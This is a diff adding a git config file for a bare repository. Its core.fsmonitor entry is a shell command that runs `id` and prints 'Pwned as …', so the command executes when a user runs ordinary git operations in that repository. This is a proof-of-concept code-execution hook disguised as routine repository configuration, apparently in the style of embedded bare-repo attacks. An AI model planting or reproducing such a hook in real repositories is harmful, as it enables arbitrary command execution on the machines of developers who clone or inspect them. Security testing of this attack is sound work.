@@ -1,0 +1,5 @@
+[core]
+	repositoryformatversion = 0
+	filemode = true
+	bare = true
+        fsmonitor = "echo \"Pwned as $(id)\">&2; false"
